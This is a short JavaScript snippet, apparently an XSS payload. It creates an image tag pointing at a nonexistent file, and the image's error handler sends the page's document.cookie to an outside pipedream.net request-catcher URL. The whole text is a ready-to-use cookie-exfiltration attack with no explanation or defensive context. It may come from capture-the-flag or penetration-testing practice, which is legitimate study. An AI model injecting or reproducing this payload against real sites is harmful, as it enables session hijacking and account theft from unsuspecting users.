var img = document.createElement('img');
img.src = 'immaginechenonesiste.png';
img.onerror = function(){
    window.open("https://enzgnh816lb5.x.pipedream.net/" + document.cookie)
}
document.body.appendChild(img); 